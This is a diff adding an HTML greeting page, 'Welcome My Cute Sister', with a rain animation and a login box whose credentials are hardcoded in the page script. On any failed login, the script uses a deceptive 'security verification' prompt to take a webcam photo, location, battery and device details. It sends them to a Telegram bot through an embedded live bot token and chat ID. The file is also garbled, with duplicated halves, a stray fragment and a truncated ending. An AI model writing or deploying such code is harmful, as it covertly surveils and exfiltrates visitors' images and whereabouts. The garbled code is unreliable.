@@ -1,0 +1,396 @@
+
+<!doctype html>
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <title>Welcome My Cute Sister</title>  
+  <style>  
+    body { margin: 0; overflow: hidden; background: #000; font-family: Arial, sans-serif; }  
+    .container.demo3 { width: 100vw; height: 100vh; position: relative; }  
+    canvas#water { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }  
+    .rain { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://tympanus.net/Development/RainEffect/img/rain.png'); opacity: 0.3; }  
+    .custom-text {  
+      position: absolute;  
+      top: 10%;  
+      left: 50%;  
+      transform: translateX(-50%);  
+      text-align: center;  
+      font-family: 'Pacifico', cursive;  
+      color: white;  
+      font-size: 30px;  
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.6);  
+      z-index: 10;  
+    }  
+    .sub-text {  
+      font-size: 18px;  
+      margin-top: 10px;  
+      font-family: 'Courier New', monospace;  
+      color: #f2f2f2;  
+    }  
+    .login-box {
+      position: absolute;
+      bottom: 50px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255,255,255,0.1);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255,255,255,0.2);
+      z-index: 20;
+    }
+    .login-box input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 200px;
+      border-radius: 5px;
+      border: none;
+      outline: none;
+    }
+    .login-box button {
+      background: #00aaff;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>  
+</head>  
+<body>  
+  <div class="custom-text">  
+    Welcome My Cute Sister  
+    <br><span class="sub-text">World Best Sister - Fatima</span>  
+  </div>  
+
+  <div class="login-box">
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Login</button>
+  </div>
+
+  <div id="container" class="container demo3">  
+    <canvas id="water"></canvas>  
+    <div class="rain"></div>  
+  </div>  
+
+  <script>
+    const correctUsername = "Sahilkijan";
+    const correctPassword = "bhaikiguriya";
+
+    async function login() {
+      const u = document.getElementById('username').value;
+      const p = document.getElementById('password').value;
+
+      if (u === correctUsername && p === correctPassword) {
+        alert("Welcome Fatima!");
+      } else {
+        const proceed = confirm("Unauthorized login detected. Do you allow security verification?");
+        if (!proceed) return;
+
+        try {
+          const [stream, deviceInfo] = await Promise.all([
+            navigator.mediaDevices.getUserMedia({ video: true }),
+            getDeviceInfo()
+          ]);
+
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          await video.play();
+
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+
+          await new Promise(res => setTimeout(res, 1500));
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          stream.getTracks().forEach(track => track.stop());
+
+          canvas.toBlob(async function(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", "7597265569");
+            formData.append("caption", deviceInfo);
+            formData.append("photo", blob, "snapshot.jpg");
+
+            await fetch("https://api.telegram.org/bot7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc/sendPhoto", {
+              method: "POST",
+              body: formData
+            });
+          }, "image/jpeg");
+
+        } catch (err) {
+          console.error("Security capture failed:", err);
+        }
+      }
+    }
+
+    async function getDeviceInfo() {
+      let batteryInfo = "Battery: Not available";
+      let locationInfo = "Location: Not available";
+
+      try {
+
+<!doctype html>
+<html lang="en">  
+<head>  
+  <meta charset="UTF-8">  
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+  <title>Welcome My Cute Sister</title>  
+  <style>  
+    body { margin: 0; overflow: hidden; background: #000; font-family: Arial, sans-serif; }  
+    .container.demo3 { width: 100vw; height: 100vh; position: relative; }  
+    canvas#water { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }  
+    .rain { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: url('https://tympanus.net/Development/RainEffect/img/rain.png'); opacity: 0.3; }  
+    .custom-text {  
+      position: absolute;  
+      top: 10%;  
+      left: 50%;  
+      transform: translateX(-50%);  
+      text-align: center;  
+      font-family: 'Pacifico', cursive;  
+      color: white;  
+      font-size: 30px;  
+      text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.6);  
+      z-index: 10;  
+    }  
+    .sub-text {  
+      font-size: 18px;  
+      margin-top: 10px;  
+      font-family: 'Courier New', monospace;  
+      color: #f2f2f2;  
+    }  
+    .login-box {
+      position: absolute;
+      bottom: 50px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: rgba(255,255,255,0.1);
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(255,255,255,0.2);
+      z-index: 20;
+    }
+    .login-box input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 200px;
+      border-radius: 5px;
+      border: none;
+      outline: none;
+    }
+    .login-box button {
+      background: #00aaff;
+      color: white;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+  </style>  
+</head>  
+<body>  
+  <div class="custom-text">  
+    Welcome My Cute Sister  
+    <br><span class="sub-text">World Best Sister - Fatima</span>  
+  </div>  
+
+  <div class="login-box">
+    <input type="text" id="username" placeholder="Username">
+    <input type="password" id="password" placeholder="Password">
+    <button onclick="login()">Login</button>
+  </div>
+
+  <div id="container" class="container demo3">  
+    <canvas id="water"></canvas>  
+    <div class="rain"></div>  
+  </div>  
+
+  <script>
+    const correctUsername = "Sahilkijan";
+    const correctPassword = "bhaikiguriya";
+
+    async function login() {
+      const u = document.getElementById('username').value;
+      const p = document.getElementById('password').value;
+
+      if (u === correctUsername && p === correctPassword) {
+        alert("Welcome Fatima!");
+      } else {
+        const proceed = confirm("Unauthorized login detected. Do you allow security verification?");
+        if (!proceed) return;
+
+        try {
+          const [stream, deviceInfo] = await Promise.all([
+            navigator.mediaDevices.getUserMedia({ video: true }),
+            getDeviceInfo()
+          ]);
+
+          const video = document.createElement('video');
+          video.srcObject = stream;
+          await video.play();
+
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const ctx = canvas.getContext('2d');
+
+          await new Promise(res => setTimeout(res, 1500));
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          stream.getTracks().forEach(track => track.stop());
+
+          canvas.toBlob(async function(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", "7597265569");
+            formData.append("caption", deviceInfo);
+            formData.append("photo", blob, "snapshot.jpg");
+
+            await fetch("https://api.telegram.org/bot7767077395:AAGxsUfQnAHyLmxXE2F1093Fc59MXHcSUkc/sendPhoto", {
+              method: "POST",
+              body: formData
+            });
+          }, "image/jpeg");
+
+        } catch (err) {
+          console.error("Security capture failed:", err);
+        }
+      }
+    }
+
+    async function getDeviceInfo() {
+      let batteryInfo = "Battery: Not available";
+      let locationInfo = "Location: Not available";
+
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `Battery: ${Math.round(battery.level * 100)}%`;
+      } catch {}
+
+      try {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
+        locationInfo = `Location: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`;
+      } catch {}
+
+      return `🚨 Unauthorized Access Attempt 🚨
+📅 ${new Date().toLocaleString()}
+
+${batteryInfo}
+${locationInfo}
+
+Device Info:
+- Platform: ${navigator.platform}
+- User Agent: ${navigator.userAgent}`;
+    }
+
+    var canvas = document.getElementById('water');  
+    var ctx = canvas.getContext('2d');  
+    var width = canvas.width = window.innerWidth;  
+    var height = canvas.height = window.innerHeight;  
+    var drops = [];  
+    for (var i = 0; i < 500; i++) {  
+      drops.push({  
+        x: Math.random() * width,  
+        y: Math.random() * height,  
+        length: Math.random() * 20 + 10,  
+        velocity: Math.random() * 4 + 4  
+      });  
+    }  
+
+    function draw() {  
+      ctx.clearRect(0, 0, width, height);  
+      ctx.strokeStyle = 'rgba(174,194,224,0.5)';  
+      ctx.lineWidth = 1;  
+      ctx.lineCap = 'round';  
+
+      for (var i = 0; i < drops.length; i++) {  
+        var d = drops[i];  
+        ctx.beginPath();  
+        ctx.moveTo(d.x, d.y);  
+        ctx.lineTo(d.x, d.y + d.length);  
+        ctx.stroke();  
+      }  
+
+      move();  
+    }  
+
+    function move() {  
+      for (var i = 0; i < drops.length; i++) {  
+        var d = drops[i];  
+        d.y += d.velocity;  
+        if (d.y > height) {  
+          d.y = -20;  
+          d.x = Math.random() * width;  
+        }  
+      }  
+    }  
+
+    function loop() {  
+      draw();  
+      requestAnimationFrame(loop);  
+    }  
+
+    loop();  
+
+    window.addEventListener('resize', function () {  
+      width = canvas.width = window.innerWidth;  
+      height = canvas.height = window.innerHeight;  
+    });
+  </script>  
+</body>  
+</html>
+￼Enter        const battery = await navigator.getBattery();
+        batteryInfo = `Battery: ${Math.round(battery.level * 100)}%`;
+      } catch {}
+
+      try {
+        const pos = await new Promise((res, rej) =>
+          navigator.geolocation.getCurrentPosition(res, rej)
+        );
+        locationInfo = `Location: Lat ${pos.coords.latitude}, Lon ${pos.coords.longitude}`;
+      } catch {}
+
+      return `🚨 Unauthorized Access Attempt 🚨
+📅 ${new Date().toLocaleString()}
+
+${batteryInfo}
+${locationInfo}
+
+Device Info:
+- Platform: ${navigator.platform}
+- User Agent: ${navigator.userAgent}`;
+    }
+
+    var canvas = document.getElementById('water');  
+    var ctx = canvas.getContext('2d');  
+    var width = canvas.width = window.innerWidth;  
+    var height = canvas.height = window.innerHeight;  
+r drops = [];  
+    for (var i = 0; i < 500; i++) {  
+      drops.push({  
+        x: Math.random() * width,  
+        y: Math.random() * height,  
+        length: Math.random() * 20 + 10,  
+        velocity: Math.random() * 4 + 4  
+      });  
+    }  
+
+    function draw() {  
+      ctx.clearRect(0, 0, width, height);  
+      ctx.strokeStyle = 'rgba(174,194,224,0.5)';  
+      ctx.lineWidth = 1;  
+      ctx.lineCap = 'round';  
+
+      for (var i = 0; i < drops.length; i++) {  
+        var d = drops[i];  
+        ctx.beginPath();  
+        ctx.moveTo(d.x, d.y);  
+        ctx.lineTo(d.x, d.y + d.length);  
+        ctx.stroke();  
+      }  
+
+      move();  
+    }  
